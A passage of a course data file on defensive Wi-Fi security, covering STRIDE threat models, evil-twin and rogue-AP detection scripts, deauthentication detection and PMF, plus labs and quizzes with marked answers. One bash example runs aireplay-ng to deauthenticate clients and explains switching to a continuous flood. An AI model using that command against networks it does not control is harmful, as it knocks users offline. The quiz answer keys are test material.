addresses. 2) <strong>Layer 1 DoS:</strong> RF jamming across a specific channel or entire band. 3) <strong>Resource Exhaustion:</strong> Flooding the AP with association requests or fake auth frames.</li><li><strong>Mitigations:</strong> Protected Management Frames (PMF) to prevent deauth attacks, RF monitoring to detect jammers, configuring rate limiting on APs.</li></ul><h3>Elevation of Privilege (Authorization)</h3><ul><li><strong>Wireless Manifestation:</strong> Gaining unauthorized access to resources or privileges.</li><li><strong>Examples:</strong> 1) <strong>VLAN Hopping:</strong> Gaining access to a secure corporate VLAN from a less-secure guest VLAN through protocol manipulation or AP misconfiguration. 2) <strong>Credential Theft:</strong> Using an Evil Twin to harvest WPA2-Enterprise credentials. 3) <strong>Exploiting Client Vulnerabilities:</strong> Once on a network, attacking vulnerable clients to gain higher privileges on endpoint devices.</li><li><strong>Mitigations:</strong> Strict VLAN segmentation, NAC, client system hardening, regular vulnerability assessments.</li></ul>",
                },
                {
                  title:
                    "Attacker Personas, Asset Mapping, and Risk Prioritization",
                  content:
                    "<p>A threat model is only as good as its understanding of the adversary and what they want.</p><h3>Attacker Personas (The 'Who')</h3><ul><li><strong>The Script Kiddie:</strong> Low skill, uses pre-packaged tools. Goal: disruption, notoriety. Likely to use deauth attacks or crack weak WPA2 passwords.</li><li><strong>The Opportunistic Attacker:</strong> Moderate skill, seeks easy wins. Goal: data theft, free internet. Likely to use Evil Twins on open networks or attack WPS.</li><li><strong>The Determined External Attacker:</strong> High skill, targeted. Goal: intellectual property theft, espionage. Likely to use sophisticated Evil Twins, exploit WPA2-Enterprise misconfigurations, and use custom tools.</li><li><strong>The Malicious Insider:</strong> Has physical access and potentially some network knowledge. Goal: sabotage, data exfiltration. May plant a rogue AP or target specific internal systems.</li></ul><h3>Asset Mapping & Data Flow Diagrams (The 'What')</h3><p>You cannot protect what you don't know exists. Create a diagram that includes:</p><ul><li><strong>Physical Assets:</strong> APs, controllers, antennas, cables.</li><li><strong>Logical Assets:</strong> SSIDs, VLANs, RADIUS servers, the PSK itself.</li><li><strong>Data Assets:</strong> User credentials, customer data, intellectual property.</li><li><strong>Data Flows:</strong> Map how data moves from a client, through the AP, to the wired network and eventually to the internet or internal servers. Identify trust boundaries between these zones (e.g., between Guest and Corporate VLANs).</li></ul><h3>Risk Assessment & Prioritization</h3><p>Not all threats are created equal. Use a simple risk matrix to prioritize:</p><p><strong>Risk = Likelihood × Impact</strong></p><ul><li><strong>Likelihood:</strong> How probable is it that a specific threat actor will execute this attack? (e.g., Deauth attacks are high likelihood; WPA3 cracking is currently low likelihood).</li><li><strong>Impact:</strong> What is the business cost if the attack succeeds? (e.g., Customer data breach = High impact; temporary internet outage for guests = Medium impact).</li></ul><p>Focus mitigation efforts on High-Likelihood/High-Impact and High-Likelihood/Medium-Impact risks first.</p>",
                },
              ],
              codeExamples: [
                {
                  title: "1. Automated STRIDE Threat Brainstorming Script",
                  description:
                    "This Python script provides a structured prompt to help analysts brainstorm potential threats for each STRIDE category based on a network description.",
                  code: 'def brainstorm_wifi_threats():\n    """\n    Guides a user through a structured STRIDE brainstorming session for a wireless network.\n    """\n    print("=== WLAN STRIDE Threat Brainstorming Tool ===\\n")\n    \n    # Get basic info about the target network\n    ssid = input("Enter the target SSID (or \'any\' for general threats): ").strip()\n    security_type = input("Enter security type (Open, WEP, WPA2-PSK, WPA2-Enterprise, WPA3): ").strip().lower()\n    \n    print(f"\\nBrainstorming threats for SSID: {ssid} ({security_type})")\n    print("Consider each STRIDE category. Press Enter after each idea (leave blank to skip).\\n")\n    \n    stride_categories = {\n        "S": "Spoofing",\n        "T": "Tampering",\n        "R": "Repudiation",\n        "I": "Information Disclosure",\n        "D": "Denial of Service",\n        "E": "Elevation of Privilege"\n    }\n    \n    threats = {}\n    \n    for code, name in stride_categories.items():\n        print(f"--- {name} Threats ---")\n        threat_list = []\n        while True:\n            threat = input(f"  Idea ({code}): ").strip()\n            if not threat:\n                break\n            threat_list.append(threat)\n        if threat_list:\n            threats[name] = threat_list\n        print()\n    \n    # Print the generated threat model\n    print("\\n=== GENERATED THREAT MODEL ===")\n    print(f"Target: {ssid} ({security_type})")\n    for category, threat_list in threats.items():\n        print(f"\\n{category}:")\n        for i, threat in enumerate(threat_list, 1):\n            print(f"  {i}. {threat}")\n    \n    return threats\n\n# Run the brainstorming session\nthreat_model = brainstorm_wifi_threats()',
                },
                {
                  title: "2. Simple Risk Matrix Calculator",
                  description:
                    "This script helps quantify and prioritize identified threats based on likelihood and impact.",
                  code: 'def prioritize_threats(threats_dict):\n    """\n    Takes a dictionary of threats and allows user to assign likelihood and impact scores.\n    Calculates and displays a prioritized list.\n    """\n    prioritized_list = []\n    \n    print("=== Threat Prioritization ===")\n    print("For each threat, rate Likelihood and Impact on a scale of 1-3 (3=Highest).")\n    print("Risk = Likelihood * Impact\\n")\n    \n    for category, threat_list in threats_dict.items():\n        for threat in threat_list:\n            print(f"Threat: {threat}")\n            try:\n                likelihood = int(input("  Likelihood (1-3): "))\n                impact = int(input("  Impact (1-3): "))\n                if not (1 <= likelihood <= 3 and 1 <= impact <= 3):\n                    raise ValueError\n            except ValueError:\n                print("  Invalid input. Using default (1,1).")\n                likelihood, impact = 1, 1\n            \n            risk_score = likelihood * impact\n            prioritized_list.append({\n                "threat": threat,\n                "category": category,\n                "likelihood": likelihood,\n                "impact": impact,\n                "risk": risk_score\n            })\n            print()\n    \n    # Sort by risk score (descending)\n    prioritized_list.sort(key=lambda x: x[\'risk\'], reverse=True)\n    \n    # Print results\n    print("\\n=== PRIORITIZED THREATS ===")\n    print("Risk | L | I | Threat")\n    print("-" * 50)\n    for item in prioritized_list:\n        print(f"{item[\'risk\']:4} | {item[\'likelihood\']} | {item[\'impact\']} | [{item[\'category\']}] {item[\'threat\']}")\n    \n    return prioritized_list\n\n# Example usage (would use the output from brainstorm_wifi_threats())\n# sample_threats = {"Spoofing": ["Evil Twin AP", "MAC Spoofing"]}\n# prioritize_threats(sample_threats)',
                },
              ],
              activities: [
                {
                  title:
                    "Comprehensive WLAN Threat Model for a Hospital Network",
                  description:
                    "**Scenario:** A hospital has two SSIDs: 'HOSPITAL-CORP' (WPA2-Enterprise for medical devices and staff) and 'HOSPITAL-GUEST' (Open with a captive portal for visitors). The corporate network has access to patient records and medical device controllers. \\n\\n**Task:** 1. Create a data flow diagram showing the two networks and their connection points. 2. Identify at least 2 threats for each STRIDE category. 3. Create attacker personas for this context (e.g., a curious visitor, a disgruntled employee, a targeted attacker seeking patient data). 4. Using the risk matrix, prioritize the top 5 threats. 5. For each top threat, propose a specific technical or administrative mitigation.",
                },
                {
                  title: "STRIDE Analysis on Your Lab Network",
                  description:
                    "1. Set up your lab AP with a specific configuration (e.g., WPA2-PSK). 2. Use the provided Python scripts to conduct a structured STRIDE analysis. 3. Document the process and results, justifying your likelihood and impact scores. 4. Based on your findings, propose one change to harden your lab AP's configuration and explain which threat it mitigates.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "In the STRIDE model, which category best describes an attack where a malicious actor sets up an access point with the same SSID as a corporate network to harvest user credentials?",
                  options: [
                    "Tampering",
                    "Spoofing",
                    "Repudiation",
                    "Elevation of Privilege",
                  ],
                  correct: 1,
                  explanation:
                    "This is a classic example of Spoofing. The attacker is spoofing the identity of the legitimate network infrastructure (the AP) to deceive users into connecting and providing their credentials.",
                },
                {
                  id: 2,
                  question:
                    "Why is 'Repudiation' a particularly significant threat for networks using WPA2-Personal (PSK)?",
                  options: [
                    "Because WPA2-PSK logs all user activity in great detail.",
                    "Because the shared key means any authorized user could perform malicious activity, and it would be impossible to prove which specific user did it based on wireless authentication alone.",
                    "Because WPA2-PSK requires biometric authentication.",
                    "Because it automatically alerts administrators of any misuse.",
                  ],
                  correct: 1,
                  explanation:
                    "The fundamental nature of a pre-shared key is that it is shared. All users authenticate with the same credential. Therefore, any action taken on the network cannot be reliably traced back to a specific individual based solely on wireless authentication data, creating a repudiation risk.",
                },
                {
                  id: 3,
                  question:
                    "When building attacker personas for threat modeling, what is the primary purpose of defining the 'Script Kiddie' persona?",
                  options: [
                    "To dismiss low-level threats as unimportant.",
                    "To understand the tools, motivations, and most likely attack vectors of a low-skill but high-frequency adversary, ensuring baseline defenses are adequate.",
                    "To practice advanced countermeasures.",
                    "To identify state-sponsored espionage tactics.",
                  ],
                  correct: 1,
                  explanation:
                    "The 'Script Kiddie' persona represents a high-likelihood, low-sophistication threat. Understanding this persona ensures that the most common and noisy attacks (like deauth floods or attacks on weak passwords) are covered by basic security hygiene, allowing resources to then focus on more determined adversaries.",
                },
                {
                  id: 4,
                  question:
                    "A hospital's guest Wi-Fi network is open and has a captive portal. Its main corporate network is WPA2-Enterprise. According to the STRIDE model, what is the primary 'Elevation of Privilege' risk at the trust boundary between these two networks?",
                  options: [
                    "An attacker on the guest network compromising the captive portal server to gain access to the corporate network.",
                    "An attacker using a deauthentication attack against the corporate network.",
                    "An attacker eavesdropping on guest user traffic.",
                    "An attacker spoofing the MAC address of a medical device.",
                  ],
                  correct: 0,
                  explanation:
                    "The most likely Elevation of Privilege vector in this scenario is attacking the infrastructure that separates the two networks. If the captive portal server or the network segmentation (VLANs, firewall rules) is misconfigured or vulnerable, an attacker on the guest network could pivot to gain unauthorized access to the more trusted corporate network.",
                },
              ],
            },
          },
          {
            id: "lesson-6",
            title: "Evil Twin & Rogue AP: Detection (Not Exploitation)",
            duration: "100 min",
            objectives: [
              "Differentiate between a Rogue AP (unauthorized on the network) and an Evil Twin (malicious imitation) and understand their distinct threat models.",
              "Identify and analyze multiple technical indicators of unauthorized APs from passive frame analysis, including beacon inconsistencies, timing anomalies, and signal strength analysis.",
              "Understand and apply the principles of Wireless Intrusion Detection Systems (WIDS) for automated monitoring and alerting.",
              "Develop a systematic process for investigating and confirming suspected rogue APs and evil twins.",
            ],
            content: {
              overview:
                "The ability to detect unauthorized wireless devices is a critical defensive skill. A Rogue AP connected to your internal network creates a backdoor, while an Evil Twin acts as a phishing site for your users' credentials. This lesson focuses exclusively on the detection methodologies, teaching you how to analyze the radio frequency (RF) environment to identify these threats with high confidence. We will cover manual techniques for deep analysis and explore how automated WIDS solutions implement these checks at scale.",
              sections: [
                {
                  title: "Rogue AP vs. Evil Twin: Definitions and Implications",
                  content:
                    "<p>While often used interchangeably, these terms describe distinct threats with different detection and mitigation paths.</p><h3>Rogue Access Point</h3><ul><li><strong>Definition:</strong> Any wireless AP that has been connected to a secured corporate network without authorization. This could be a consumer-grade router an employee plugged in for 'better Wi-Fi,' or a device maliciously planted by an attacker.</li><li><strong>Primary Threat:</strong> It bypasses perimeter security, creating an unmonitored wireless entry point into the trusted network. An attacker in the parking lot could use it to access internal resources.</li><li><strong>Detection Focus:</strong> Correlating wireless observations with wired network inventory. Is this BSSID seen on the wire? Is it in our list of authorized APs?</li></ul><h3>Evil Twin Access Point</h3><ul><li><strong>Definition:</strong> A malicious AP that intentionally mimics the broadcast characteristics (SSID, and sometimes BSSID) of a legitimate network. It is often not connected to the target's real network but may have its own internet connection.</li><li><strong>Primary Threat:</strong> Phishing. It tricks users into connecting to it, allowing the attacker to perform Man-in-the-Middle (MitM) attacks, harvest credentials, and capture all victim traffic.</li><li><strong>Detection Focus:</strong> Identifying subtle inconsistencies in the wireless beacon frames and client behavior that betray the impersonation.</li></ul>",
                },
                {
                  title: "Deep Dive: Detection Methodologies and Heuristics",
                  content:
                    "<p>Detection relies on finding anomalies. The following heuristics are used by security analysts and automated WIDS.</p><h3>1. Beacon Frame Analysis (The Fingerprint)</h3><ul><li><strong>BSSID Mismatch:</strong> The most straightforward sign. The SSID matches the legitimate network, but the MAC address (BSSID) is different. Advanced attackers may spoof the BSSID as well.</li><li><strong>Security & Capability Mismatch:</strong> The legitimate network uses WPA2-Enterprise, but the rogue AP is broadcasting as Open or WPA2-PSK. Or the supported data rates, channel widths, or other Information Elements (IEs) don't match the known profile of corporate APs.</li><li><strong>Vendor OUI Mismatch:</strong> The first three bytes of a MAC address indicate the vendor. If all corporate APs are from Aruba (OUI 00:0B:86), but a new AP has the same SSID and a D-Link OUI (00:1C:10), it's highly suspicious.</li></ul><h3>2. RF Fingerprinting and Location</h3><ul><li><strong>RSSI (Received Signal Strength Indicator):</strong> A WIDS with multiple sensors can use triangulation or signal strength analysis. If a sensor in the server room suddenly sees the 'CorpNet' SSID with a very strong signal, but the known AP is two floors away, it indicates a rogue AP nearby.</li><li><strong>Time of Arrival / Location Tracking:</strong> Enterprise WIDS can track the physical location of a radio source. An AP that moves or appears in an unusual location (e.g., a public lobby) is a major red flag.</li></ul><h3>3. Behavioral and Timing Analysis</h3><ul><li><strong>Beacon Timing Interval:</strong> Most APs send beacons at consistent intervals (e.g., every 102.4 ms). A significant deviation from the norm can be a sign of software-based APs (e.g., hostapd on a laptop) which may have less precise timing.</li><li><strong>Client Association Patterns:</strong> A legitimate AP will have a stable set of associated clients. A new Evil Twin AP will have few or no associations initially, and then may suddenly have clients associating with it (if the attack is successful).</li></ul><h3>4. Wired-Side Correlation (For Rogue APs)</h3><ul><li><strong>SNMP Polling:</strong> Querying network switches to see which MAC addresses are active on which ports and comparing that to the list of authorized APs.</li><li><strong>DHCP & Router Logging:</strong> Checking DHCP server logs for lease requests from MAC addresses that are not known authorized APs.</li><li><strong>Active Probing:</strong> Tools like <code>roguecheck.py</code> can attempt to connect to the suspected rogue AP's management interface using default credentials to confirm its make/model.</li></ul>",
                },
                {
                  title:
                    "The Role of Wireless Intrusion Detection Systems (WIDS)",
                  content:
                    "<p>Manual detection is not scalable. WIDS automate this process using dedicated sensors or APs in monitor mode.</p><ul><li><strong>Function:</strong> Sensors constantly monitor all channels, collecting beacons, probe responses, and other frames. They build a database of all observed BSSIDs and clients.</li><li><strong>Policy-Based Detection:</strong> The WIDS is configured with a policy: 'These BSSIDs are authorized.' Any other AP broadcasting a corporate SSID is flagged as a rogue. Any AP with a strong signal inside the building that is not on the authorized list is flagged.</li><li><strong>Anomaly-Based Detection:</strong> The WIDS learns the normal 'fingerprint' of the RF environment (normal signal strength patterns, normal client count). Deviations from this baseline, like a new AP appearing or a known AP's signal strength changing dramatically, trigger alerts.</li><li><strong>Response:</strong> A Wireless Intrusion Prevention System (WIPS) can actively contain a threat by sending deauthentication frames to clients connected to a confirmed rogue AP, effectively quarantining it.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title: "1. Advanced Evil Twin Detection Script",
                  description:
                    "This script performs a detailed analysis of a packet capture, looking for multiple indicators of Evil Twin APs beyond simple SSID matching.",
                  code: "from scapy.all import *\nfrom scapy.layers.dot11 import Dot11, Dot11Elt\n\ndef advanced_evil_twin_detection(pcap_file, known_ssids):\n    \"\"\"\n    Analyzes a PCAP for advanced signs of Evil Twin APs.\n    known_ssids: A dictionary of known good SSIDs and their expected BSSID prefixes (OUIs).\n    \"\"\"\n    print(f\"[+] Advanced Evil Twin Detection on: {pcap_file}\")\n    \n    # Dictionary to store AP details: {ssid: {bssid: {details}}}\n    ap_db = {}\n    \n    packets = rdpcap(pcap_file)\n    for pkt in packets:\n        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8: # Beacon\n            bssid = pkt.addr2\n            ssid = \"\"\n            channel = None\n            rsn_info = None\n            vendor_oui = bssid.upper().replace(':', '')[:6] # First 6 chars of MAC\n            \n            elt = pkt.getlayer(Dot11Elt)\n            while isinstance(elt, Dot11Elt):\n                if elt.ID == 0: # SSID\n                    try:\n                        ssid = elt.info.decode('utf-8', errors='ignore')\n                    except:\n                        ssid = \"<Hidden>\"\n                elif elt.ID == 3: # DS Parameter Set (Channel)\n                    channel = ord(elt.info)\n                elif elt.ID == 48: # RSN Information\n                    rsn_info = elt.info\n                elt = elt.payload.getlayer(Dot11Elt)\n            \n            if ssid and ssid in known_ssids:\n                if ssid not in ap_db:\n                    ap_db[ssid] = {}\n                if bssid not in ap_db[ssid]:\n                    ap_db[ssid][bssid] = {'channel': channel, 'vendor_oui': vendor_oui, 'rsn_info': rsn_info}\n    \n    # Analysis Logic\n    print(\"\\n--- Analysis Results ---\")\n    for ssid, bssids in ap_db.items():\n        expected_oui = known_ssids.get(ssid, \"\")\n        \n        if len(bssids) > 1:\n            print(f\"[ALERT] Multiple BSSIDs found for SSID '{ssid}':\")\n            for bssid, details in bssids.items():\n                print(f\"  - BSSID: {bssid} | Channel: {details['channel']} | Vendor: {details['vendor_oui']}\")\n                \n                # Check 1: Vendor OUI Mismatch\n                if expected_oui and details['vendor_oui'] != expected_oui:\n                    print(f\"    [SUSPICIOUS] Vendor OUI {details['vendor_oui']} does not match expected OUI {expected_oui}.\")\n                \n                # Check 2: Channel Mismatch (simplified - a real WIDS would know the expected channel)\n                # If two APs with same SSID are on different channels, it's highly suspicious.\n                other_channels = [d['channel'] for b, d in bssids.items() if b != bssid]\n                if details['channel'] in other_channels:\n                    print(f\"    [SUSPICIOUS] Multiple APs on same channel ({details['channel']}). Could be a conflict or an attack.\")\n        \n        # Check 3: Different Security Profiles for same SSID\n        unique_rsn = {str(d['rsn_info']) for d in bssids.values()}\n        if len(unique_rsn) > 1:\n            print(f\"    [SUSPICIOUS] Multiple security configurations found for '{ssid}'.\")\n\n# Define known networks: SSID -> Expected Vendor OUI (first 6 of MAC)\nknown_networks = {\n    \"CorpNet\": \"A0B1C2\", # e.g., Aruba OUI\n    \"Guest-WiFi\": \"D4E5F6\" # e.g., Cisco OUI\n}\n\nadvanced_evil_twin_detection('network_capture.pcap', known_networks)",
                },
                {
                  title: "2. Simulating WIDS Sensor Data for RSSI Analysis",
                  description:
                    "This script simulates how a WIDS with multiple sensors would analyze signal strength to locate a potential rogue AP.",
                  code: 'import math\n\ndef estimate_distance(rssi, measured_power= -30, environmental_factor=2):\n    """\n    Roughly estimates distance from RSSI using the log-distance path loss model.\n    measured_power: RSSI at 1 meter (depends on AP power)\n    environmental_factor: Path loss exponent (2 for free space, higher for obstacles)\n    """\n    try:\n        distance = 10 ** ((measured_power - rssi) / (10 * environmental_factor))\n        return max(1, distance) # Return at least 1 meter\n    except:\n        return None\n\ndef analyze_ap_location(sensor_readings):\n    """\n    sensor_readings: List of tuples (sensor_name, sensor_x, sensor_y, rssi)\n    Performs simple centroid calculation based on estimated distances.\n    """\n    print("Estimating AP location based on RSSI from multiple sensors:")\n    \n    total_x, total_y, total_weight = 0, 0, 0\n    estimated_points = []\n    \n    for sensor_name, x, y, rssi in sensor_readings:\n        dist = estimate_distance(rssi)\n        if dist:\n            # Weight inversely proportional to distance (stronger signal = closer)\n            weight = 1.0 / dist\n            total_x += x * weight\n            total_y += y * weight\n            total_weight += weight\n            estimated_points.append((x, y, dist))\n            print(f"  {sensor_name}: RSSI {rssi} dBm -> est. distance {dist:.1f}m")\n    \n    if total_weight > 0:\n        centroid_x = total_x / total_weight\n        centroid_y = total_y / total_weight\n        print(f"\\nEstimated AP location: ({centroid_x:.1f}, {centroid_y:.1f})")\n        \n        # Check if estimated location is anomalous (e.g., in a public area)\n        if centroid_x > 50: # Example: if x > 50, it\'s in the public lobby\n            print("[ALERT] Estimated AP location is in an unauthorized area (e.g., public lobby). Potential Rogue AP.")\n        \n        return centroid_x, centroid_y\n    else:\n        print("Could not estimate location.")\n        return None\n\n# Example: Sensor data (sensor name, x coord, y coord, RSSI reading)\nsensor_data = [\n    ("Sensor1", 10, 10, -45), # Strong signal near known AP location\n    ("Sensor2", 50, 50, -75), # Weaker signal further away\n    ("Sensor3", 90, 10, -85)  # Weak signal from far away\n]\n\nanalyze_ap_location(sensor_data)',
                },
              ],
              activities: [
                {
                  title: "Evil Twin Investigation Lab",
                  description:
                    "**Scenario:** Your WIDS has alerted you to a potential Evil Twin for the 'CorpNet' SSID. \\n\\n**Task:** 1. In your lab, set up two APs: one legitimate AP (e.g., your lab router) broadcasting 'CorpNet' with WPA2-AES, and one Evil Twin (e.g., a smartphone hotspot or second router) also broadcasting 'CorpNet' but as an Open network. 2. Capture traffic for 5 minutes using `airodump-ng -w investigation`. 3. Use the provided Python scripts to analyze the capture. 4. Write a forensic report detailing: the BSSIDs of both APs, the observed differences in their beacon frames (security, capabilities), and your conclusion on which is the Evil Twin and why.",
                },
                {
                  title: "Design a WIDS Policy for an Office",
                  description:
                    "Design a WIDS policy for a company with 3 authorized SSIDs: 'Internal' (WPA2-Enterprise), 'Guests' (Open with portal), and 'IoT' (WPA2-PSK). Define explicit rules for what should trigger an alarm. Consider: 1) How will you handle neighboring business's APs? 2) What constitutes a 'rogue' AP? (Any unauthorized AP? Any AP broadcasting our SSID? Any AP with a strong signal inside our building?) 3) What actions should the WIDS take upon detection? (Alert only? Containment?)",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the fundamental difference in the primary threat posed by a Rogue AP versus an Evil Twin AP?",
                  options: [
                    "A Rogue AP provides internet access, while an Evil Twin does not.",
                    "A Rogue AP creates an unauthorized wired network backdoor, while an Evil Twin performs wireless credential phishing.",
                    "An Evil Twin is always easier to detect than a Rogue AP.",
                    "A Rogue AP is always planted by an insider, while an Evil Twin is always from an external attacker.",
                  ],
                  correct: 1,
                  explanation:
                    "The core difference is their network connection and thus their attack vector. A Rogue AP is connected to the internal wired network, creating a backdoor. An Evil Twin is focused on tricking users into connecting to it for MitM attacks, regardless of its internet source.",
                },
                {
                  id: 2,
                  question:
                    "A WIDS sensor detects an AP with the SSID 'CompanyGuest' and a strong signal strength inside the building. The authorized 'CompanyGuest' APs are all from vendor 'Cisco' (OUI 00:40:96). This new AP has a vendor OUI of 'TP-Link' (00:1C:10). What is the most likely explanation and the appropriate next step?",
                  options: [
                    "This is a new authorized AP; add it to the approved list.",
                    "This is a clear indicator of a Rogue AP; investigate its physical location and connection to the network.",
                    "The WIDS sensor is faulty; ignore the alert.",
                    "This is a neighboring network; add its OUI to an ignore list.",
                  ],
                  correct: 1,
                  explanation:
                    "A strong signal inside the building from an AP broadcasting a corporate SSID but with a different vendor OUI is a strong indicator of a rogue device. The next step is investigation: physically locating it and checking if it's connected to the corporate network.",
                },
                {
                  id: 3,
                  question:
                    "Why is RSSI (signal strength) analysis from multiple sensors a powerful technique for detecting rogue APs?",
                  options: [
                    "It can decrypt WPA2 traffic.",
                    "It can precisely identify the model of the AP.",
                    "It can physically locate the source of the radio transmissions, potentially pinpointing an AP in an unauthorized location.",
                    "It can determine the password of the AP.",
                  ],
                  correct: 2,
                  explanation:
                    "Triangulation or signal strength analysis from multiple fixed sensors allows a WIDS to estimate the physical location of an AP. An AP appearing in a location where no authorized AP should be (e.g., a public cafeteria, a contractor's office) is a massive red flag and a key method for detection.",
                },
                {
                  id: 4,
                  question:
                    "An attacker has advanced knowledge of your network and spoofs both the SSID and the BSSID (MAC address) of a legitimate AP. Which detection heuristic would MOST likely still reveal the Evil Twin?",
                  options: [
                    "BSSID mismatch.",
                    "Vendor OUI mismatch.",
                    "A significant difference in beacon timing interval or RF fingerprinting showing two physical sources with the same BSSID.",
                    "It would be undetectable.",
                  ],
                  correct: 2,
                  explanation:
                    "If the BSSID is perfectly spoofed, more advanced detection methods are needed. RF fingerprinting can reveal that there are two distinct physical devices broadcasting frames with the same MAC address (e.g., one in its usual location, one in a parking lot). Behavioral analysis like slight timing differences in beacons (due to different hardware/software) can also provide clues. A full BSSID spoof is sophisticated but not undetectable by a capable WIDS.",
                },
              ],
            },
          },
          {
            id: "lesson-7",
            title: "Management Frame Attacks: Detection & Mitigation",
            duration: "90 min",
            objectives: [
              "Understand how Deauthentication and Disassociation attacks cause a denial of service.",
              "Explain how Protected Management Frames (PMF, 802.11w) mitigate these attacks.",
              "Analyze a packet capture to identify a surge in deauthentication frames.",
              "Develop alerting thresholds for a Wireless IDS and perform targeted deauthentication (for authorized testing).",
            ],
            content: {
              overview:
                "Because legacy 802.11 management frames are unencrypted and unauthenticated, an attacker can easily forge them to disrupt wireless service. The most common example is a 'deauth flood,' which forces clients to disconnect from the network, causing a complete Denial-of-Service (DoS). This lesson covers the mechanics of these attacks, how to detect them using a Wireless Intrusion Detection System (WIDS), and the definitive mitigation provided by Protected Management Frames (802.11w).",
              sections: [
                {
                  title: "The Anatomy of a Deauthentication Flood",
                  content:
                    "<p>A deauthentication frame is a legitimate part of the 802.11 protocol, used by an AP to inform a client it is being disconnected, or by a client to signal it is leaving the network. The critical flaw is that these frames are not authenticated.</p><p>An attacker can monitor the air to capture the MAC addresses of an AP and its connected clients. They can then spoof the source MAC address of the AP and send a deauthentication frame <strong>to the client</strong>, or spoof a client's MAC address to send a deauth frame <strong>to the AP</strong>. By flooding the network with these forged frames, the attacker creates a persistent denial of service, as clients are unable to maintain a stable connection. The broadcast deauthentication frame (target MAC: <code>ff:ff:ff:ff:ff:ff</code>) is particularly devastating as it can disconnect all clients on a channel simultaneously.</p>",
                },
                {
                  title:
                    "Mitigation with Protected Management Frames (802.11w)",
                  content:
                    "<p>Protected Management Frames (PMF) is a security standard defined in IEEE 802.11w that cryptographically protects specific management frames, including Deauthentication, Disassociation, and Robust Action frames.</p><p>When PMF is enabled and required ('PMF Mandatory'), these frames are signed with a hash-based message authentication code (HMAC). A client or AP that supports PMF will validate this signature before acting on the frame. Any forged frame lacking a valid signature is silently ignored, rendering deauthentication floods completely ineffective.</p><h3>Detection with a Wireless IDS (WIDS):</h3><p>Until a network is fully upgraded to WPA3 (which mandates PMF) or has 802.11w explicitly enabled, detection is the primary defense. A WIDS can be configured with simple threshold-based rules to detect an attack. For example, an alert should be triggered if more than 20 deauthentication frames are observed from a single source MAC address within a 10-second window, as this is almost certainly malicious behavior.</p>",
                },
              ],
              codeExamples: [
                {
                  title: "Analyze a PCAP for Management Frame Attacks",
                  language: "python",
                  code: '# This script analyzes a PCAP file to count and identify sources of malicious management frames.\n# This is a key function of a Wireless Intrusion Detection System (WIDS).\nfrom scapy.all import rdpcap, Dot11, Dot11Deauth\nfrom collections import defaultdict\n\ndef analyze_management_attacks(pcap_file, threshold=20):\n    """\n    Analyzes a PCAP for deauthentication/disassociation floods.\n    Counts frames per source MAC and reports potential attackers.\n    """\n    try:\n        packets = rdpcap(pcap_file)\n    except FileNotFoundError:\n        print(f"Error: File \'{pcap_file}\' not found.")\n        return\n\n    deauth_counter = defaultdict(int)\n    disassoc_counter = defaultdict(int)\n\n    for packet in packets:\n        if packet.haslayer(Dot11Deauth):\n            # Count deauth frames per source MAC address\n            source_mac = packet.addr2\n            deauth_counter[source_mac] += 1\n        elif packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 10: # Disassociation\n            source_mac = packet.addr2\n            disassoc_counter[source_mac] += 1\n\n    print(f"\\n[+] Management Frame Analysis for \'{pcap_file}\':")\n    print(f"  - Total Deauthentication Frames: {sum(deauth_counter.values())}")\n    print(f"  - Total Disassociation Frames: {sum(disassoc_counter.values())}")\n    \n    print(f"\\n[+] Top Deauthentication Sources (Threshold: {threshold} frames):")\n    potential_attacker_found = False\n    for mac, count in deauth_counter.items():\n        if count > threshold:\n            print(f"    [ALERT] {mac} sent {count} deauth frames.")\n            potential_attacker_found = True\n    if not potential_attacker_found:\n        print("    No source exceeded the threshold.")\n\n# Example usage\nanalyze_management_attacks(\'capture.pcap\', threshold=15)',
                },
                {
                  title: "Controlled Deauthentication Test (Using aireplay-ng)",
                  language: "bash",
                  code: "# This is a command-line example for AUTHORIZED penetration testing only.\n# It demonstrates how the attack is performed to test network resilience.\n# Syntax: deauthenticate a specific client from a specific AP.\n# -0 1: Send 1 deauthentication packet (use -0 0 for a continuous flood)\n# -a [AP MAC]: The MAC address of the target access point\n# -c [Client MAC]: The MAC address of the target client (use 'ff:ff:ff:ff:ff:ff' for broadcast)\n\nsudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon\n\n# This command would force the client AA:BB:CC:DD:EE:FF to disconnect from AP 00:11:22:33:44:55.\n# The client will then go through the process of re-associating, which can be observed in a packet capture.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "A deauthentication attack causes what kind of impact on a wireless network?",
                  options: [
                    "Data theft",
                    "Password cracking",
                    "Denial of Service",
                    "Privilege escalation",
                  ],
                  correct: 2,
                  explanation:
                    "The attack's goal is to disconnect legitimate users from the network, denying them service. It does not, by itself, lead to data compromise.",
                },
                {
                  id: 2,
                  question:
                    "What is the most effective technical control to prevent deauthentication attacks?",
                  options: [
                    "Using a long and complex Wi-Fi password.",
                    "Hiding the SSID.",
                    "Enforcing the use of Protected Management Frames (PMF/802.11w).",
                    "Using MAC address filtering.",
                  ],
                  correct: 2,
                  explanation:
                    "PMF is specifically designed to provide integrity protection for these management frames, allowing clients and APs to cryptographically distinguish legitimate frames from forged ones. The other options are easily bypassed.",
                },
                {
                  id: 3,
                  question:
                    "Why is a broadcast deauthentication frame (to ff:ff:ff:ff:ff:ff) particularly dangerous?",
                  options: [
                    "It cannot be detected by a WIDS.",
                    "It is the only type of frame protected by PMF.",
                    "It can disconnect all clients associated with the targeted AP simultaneously.",
                    "It requires the network's password to execute.",
                  ],
                  correct: 2,
                  explanation:
                    "The broadcast address targets every device listening on that channel. A single forged frame from an attacker can disrupt service for an entire group of users, making it a very efficient DoS tool.",
                },
              ],
            },
          },
          {
            id: "lesson-8",
            title: "Enterprise Wi‑Fi & 802.1X/EAP",
            duration: "120 min",
            objectives: [
              "Understand the roles of the Supplicant, Authenticator, and Authentication Server in 802.1X.",
              "Compare the security of different EAP methods, especially EAP-TLS and PEAP.",
              "Recognize the critical importance of certificate validation on the client (supplicant).",
              "Learn how RADIUS attributes like VLANs and ACLs are used for dynamic network segmentation.",
            ],
            content: {
              overview:
